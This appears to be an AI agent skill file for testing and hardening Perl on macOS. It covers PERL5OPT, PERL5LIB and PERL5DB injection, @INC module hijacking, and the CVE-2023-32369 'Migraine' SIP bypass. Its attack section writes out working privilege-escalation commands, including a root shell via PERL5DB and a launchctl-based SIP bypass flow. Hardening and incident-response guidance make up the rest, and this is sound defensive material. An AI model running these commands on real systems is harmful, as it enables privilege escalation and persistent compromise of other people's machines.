---
name: macos-perl-injection
description: macOS Perl security testing and hardening. Use this skill whenever the user needs to test for Perl-based privilege escalation on macOS, analyze PERL5OPT/PERL5LIB environment variable abuse, check for @INC path vulnerabilities, or assess CVE-2023-32369 (Migraine) SIP bypass risks. Also use for hardening recommendations and security audits of Perl applications on macOS systems.
---

# macOS Perl Injection & Hardening

A skill for security professionals to test, analyze, and harden Perl applications on macOS against environment variable injection and privilege escalation attacks.

## When to Use This Skill

Use this skill when:
- Testing macOS systems for Perl-based privilege escalation vectors
- Auditing Perl applications for environment variable injection risks
- Investigating CVE-2023-32369 (Migraine) vulnerability status
- Hardening macOS systems against Perl injection attacks
- Analyzing `PERL5OPT`, `PERL5LIB`, `PERL5DB` environment variable risks
- Checking `@INC` path for writable module directories
- Reviewing launchd/cron configurations for Perl interpreter exposure

## Safety & Ethics

**This skill is for authorized security testing only.**
- Only test systems you own or have explicit written authorization to test
- Document all findings and remediate vulnerabilities discovered
- Never use these techniques on production systems without proper change management
- Understand that some techniques require root access and may trigger TCC prompts

## Core Attack Vectors

### 1. PERL5OPT Environment Variable Injection

The `PERL5OPT` variable allows arbitrary Perl code execution before the target script runs.

**How it works:**
- Perl reads `PERL5OPT` at interpreter startup
- Content is executed as Perl code before parsing the target script
- Can execute `system()` calls, load modules, or run arbitrary code

**Test command:**
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl
```

**Module-based injection:**
```bash
# Create malicious module
cat > /tmp/pmod.pm << 'EOF'
package pmod;
system('whoami');
1;
EOF

# Load via PERL5LIB + PERL5OPT
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```

### 2. PERL5DB Debugger Injection

When Perl runs with `-d` flag, `PERL5DB` content executes in debugger context.

**Requirements:**
- Must control both environment AND command-line flags
- Target process must be started with `-d` switch
- Common in maintenance/installer scripts with verbose debugging

**Test command:**
```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl
```

### 3. @INC Path Module Hijacking

Perl searches `@INC` paths for modules. Writable paths before protected ones enable module hijacking.

**Check @INC paths:**
```bash
perl -e 'print join("\n", @INC)'
```

**Typical macOS 13/14 output:**
```
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
```

**Vulnerability:** `/Library/Perl/5.30` exists, is NOT SIP-protected, and appears BEFORE protected `/System/Library` paths.

**Attack scenario:**
1. Gain root access
2. Write malicious module to `/Library/Perl/5.30/File/Basename.pm`
3. Any script using `use File::Basename;` loads attacker code first

**Warning:** macOS shows TCC prompt for Full Disk Access when writing to `/Library/Perl`.

### 4. CVE-2023-32369 "Migraine" SIP Bypass

**Vulnerability:** `systemmigrationd` daemon has `com.apple.rootless.install.heritable` entitlement. Child processes inherit this and run outside SIP restrictions.

**Affected versions:** macOS before Ventura 13.4, Monterey 12.6.6, Big Sur 11.7.7

**Exploitation flow:**
```bash
# As root, poison environment
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger systemmigrationd to spawn Perl
open -a "Migration Assistant.app"
# Or programmatically:
# /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```

**Result:** `/usr/bin/perl` executes with malicious `PERL5OPT` in SIP-less context, allowing:
- Writing to `/System/Library/LaunchDaemons`
- Setting `com.apple.rootless` extended attributes
- Any other SIP-restricted operations

## Testing Procedures

### Quick Environment Check

Run the helper script to assess current Perl environment:

```bash
./scripts/check-perl-env.sh
```

This checks:
- Current `PERL5OPT`, `PERL5LIB`, `PERL5DB` values
- `@INC` paths and their writability
- Perl version and taint mode status
- System version for CVE-2023-32369 applicability

### Module Hijacking Test

```bash
./scripts/test-inc-paths.sh
```

This identifies writable paths in `@INC` that could be exploited.

### CVE-2023-32369 Status Check

```bash
./scripts/check-migraine-vuln.sh
```

Determines if the system is vulnerable to the Migraine SIP bypass.

## Hardening Recommendations

### 1. Clear Dangerous Environment Variables

Privileged processes should start with pristine environments:

```bash
# For launchd jobs, add to plist:
<key>EnvironmentVariables</key>
<dict>
  <key>PERL5OPT</key>
  <string></string>
  <key>PERL5LIB</key>
  <string></string>
  <key>PERL5DB</key>
  <string></string>
</dict>

# Or explicitly unset:
launchctl unsetenv PERL5OPT
launchctl unsetenv PERL5LIB
launchctl unsetenv PERL5DB

# For cron jobs, use env -i:
env -i /usr/bin/perl /path/to/script.pl
```

### 2. Use Taint Mode for Privileged Scripts

Add `-T` flag to force taint checking, which ignores unsafe switches:

```bash
#!/usr/bin/perl -T
use strict;
use warnings;
# ... rest of script
```

Or in shebang:
```bash
#!/usr/bin/perl -T -w
```

### 3. Avoid Running Interpreters as Root

- Use compiled binaries when possible
- Drop privileges early in scripts
- Run interpreters as unprivileged users with minimal permissions

### 4. Keep macOS Updated

CVE-2023-32369 is patched in:
- macOS Ventura 13.4+
- macOS Monterey 12.6.6+
- macOS Big Sur 11.7.7+

### 5. Monitor @INC Paths

Regularly audit `@INC` paths for writable directories:

```bash
perl -e 'for $p (@INC) { print "$p: ", (-d $p ? "exists" : "missing"), "\n" }'
```

### 6. Restrict /Library/Perl Access

- Set restrictive permissions on `/Library/Perl`
- Monitor for unauthorized writes
- Consider using filesystem-level protections

## Common Use Cases

### Security Audit Checklist

1. [ ] Check all `PERL5OPT`, `PERL5LIB`, `PERL5DB` values in launchd/cron
2. [ ] Audit `@INC` paths for writable directories
3. [ ] Verify macOS version against CVE-2023-32369
4. [ ] Review all Perl scripts run as root
5. [ ] Check for `-d` flag usage in privileged scripts
6. [ ] Verify taint mode on sensitive scripts
7. [ ] Test module loading with controlled environment

### Incident Response

If you suspect Perl injection:

1. Check current environment variables:
   ```bash
   env | grep -i perl
   ```

2. Review recent writes to `/Library/Perl`:
   ```bash
   ls -la /Library/Perl/5.30/
   ```

3. Check for suspicious launchd configurations:
   ```bash
   launchctl list | grep -i perl
   ```

4. Review system logs for Migration Assistant activity:
   ```bash
   log show --predicate 'process == "MigrationAssistant"' --last 24h
   ```

## References

- Microsoft Security Blog – "New macOS vulnerability, Migraine, could bypass System Integrity Protection" (CVE-2023-32369), May 30 2023
- Hackyboiz – "macOS SIP Bypass (PERL5OPT & BASH_ENV) research", May 2025
- Apple Security Updates for macOS Ventura, Monterey, Big Sur

## Helper Scripts

This skill includes the following scripts in `scripts/`:

- `check-perl-env.sh` - Comprehensive Perl environment assessment
- `test-inc-paths.sh` - Identify writable @INC paths
- `check-migraine-vuln.sh` - CVE-2023-32369 vulnerability check
- `audit-launchd-perl.sh` - Find Perl processes in launchd configurations
